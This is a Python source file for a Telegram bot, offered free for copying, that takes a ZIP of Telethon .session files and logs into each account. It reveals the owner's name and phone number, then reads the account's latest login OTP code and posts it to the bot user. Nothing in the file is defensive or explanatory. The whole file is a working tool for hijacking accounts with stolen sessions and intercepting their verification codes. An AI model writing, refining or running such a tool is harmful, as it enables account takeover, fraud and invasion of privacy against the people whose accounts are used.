#bndevloper copy bot for free for own project use and enjoy dont sell
import os, asyncio
from telethon import events, Button
from telethon import TelegramClient

from config import API_ID, API_HASH, DOWNLOADS_DIR
from utils.state import user_state, pending_otp
from utils.helpers import extract_zip, get_latest_otp
from handlers.start import (
    MAIN_KB_EXPORT as MAIN_KB,
    BTN_READ_EXPORT as BTN_READ,
)


wait_events = {}


def register(bot):

    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.text == BTN_READ))
    async def _read_start(e):
        uid = e.sender_id
        user_state.clear(uid)
        user_state.set(uid, step="waiting_zip")
        await e.reply(
            "📤 **Please Send your ZIP file**",
            buttons=MAIN_KB,
            parse_mode="md"
        )

    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.document))
    async def _zip(e):
        uid = e.sender_id
        st = user_state.get(uid)
        if st.get("step") != "waiting_zip":
            return

        fname = ""
        for attr in e.document.attributes:
            if hasattr(attr, "file_name") and attr.file_name:
                fname = attr.file_name
                break
        if not fname.endswith(".zip"):
            await e.reply("❌ सिर्फ .zip allowed")
            return

        await e.reply("♻️ Processing...\n🙏 Please wait.")

        zip_path = os.path.join(DOWNLOADS_DIR, f"{uid}_{fname}")
        await e.download_media(file=zip_path)

        out_dir = os.path.join(DOWNLOADS_DIR, f"unzip_{uid}")
        try:
            sessions = extract_zip(zip_path, out_dir)
        except Exception as ex:
            await e.reply(f"❌ ZIP Error: {ex}")
            return

        if not sessions:
            await e.reply("❌ कोई .session file नहीं मिली")
            return

        user_state.clear(uid)
        asyncio.create_task(process_sessions(bot, uid, sessions))


async def process_sessions(bot, uid, sessions):
    for sess_path in sessions:
        sess_file = os.path.basename(sess_path)
        name_no_ext = sess_file.replace(".session", "")

        client = TelegramClient(
            sess_path[:-len(".session")],
            API_ID, API_HASH
        )
        try:
            await client.connect()
            if not await client.is_user_authorized():
                await bot.send_message(
                    uid,
                    f"💀 `{name_no_ext}.session` corrupt  \n"
                    f"❌ session is no longer active",
                    parse_mode="md"
                )
                await client.disconnect()
                continue

            me = await client.get_me()
            full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Unknown"
            phone = "+" + (me.phone or "unknown")

            data = f"otp:{name_no_ext}:{uid}"
            btn = [[Button.inline("chek", data=data.encode())]]
            card = await bot.send_message(
                uid,
                f"👤 User: {full_name}\n"
                f"📱 Number: `{phone}`\n"
                f"👇 Check if you have requested OTP",
                buttons=btn,
                parse_mode="md"
            )

            ev = asyncio.Event()
            wait_events[uid] = ev

            pending_otp[name_no_ext] = {
                "client": client,
                "uid": uid,
                "card_id": card.id,
                "chat_id": card.chat_id,
                "name": full_name,
                "phone": phone,
                "event": ev,
                "bot": bot,
            }

            try:
                await asyncio.wait_for(ev.wait(), timeout=300)
            except asyncio.TimeoutError:
                try:
                    await bot.delete_messages(card.chat_id, card.id)
                except: pass
                pending_otp.pop(name_no_ext, None)
                try: await client.disconnect()
                except: pass
                wait_events.pop(uid, None)
                continue

            pending_otp.pop(name_no_ext, None)
            wait_events.pop(uid, None)

            try: await client.disconnect()
            except: pass

            await asyncio.sleep(1)

        except Exception as ex:
            await bot.send_message(
                uid,
                f"💀 `{name_no_ext}.session` corrupt  \n"
                f"❌ session is no longer active\n`{ex}`",
                parse_mode="md"
            )
            try: await client.disconnect()
            except: pass

    await bot.send_message(uid, "✅ **All sessions have been processed.**", parse_mode="md")


def register_otp_button(bot):
    @bot.on(events.CallbackQuery(pattern=b"^otp:"))
    async def _chek(e):
        try:
            _, sess_key, _uid = e.data.decode().split(":")
        except Exception:
            await e.answer("❌ Bad data", alert=True)
            return

        info = pending_otp.get(sess_key)
        if not info:
            await e.answer("❌ Session already processed", alert=True)
            return

        client = info["client"]
        name = info["name"]
        phone = info["phone"]
        bot_inst = info["bot"]
        chat_id = info["chat_id"]
        card_id = info["card_id"]

        
        await e.answer("Fetching OTP...")

        otp_code = await get_latest_otp(client)

        
        try:
            await bot_inst.delete_messages(chat_id, card_id)
        except Exception as ex:
            print(f"Delete failed: {ex}")

        # Message 1 — User + Number
        await bot_inst.send_message(
            chat_id,
            f"👤 User: {name}\n"
            f"📱 Number: `{phone}`",
            parse_mode="md"
        )

        
        if otp_code:
            await bot_inst.send_message(
                chat_id,
                f"🧩 Your OTP Code : `{otp_code}`",
                parse_mode="md"
            )
        else:
            await bot_inst.send_message(
                chat_id,
                "❌ No OTP found"
            )

        ev = info.get("event")
        if ev:
            ev.set()
#bndevloper copy bot for free for own project use and enjoy dont sell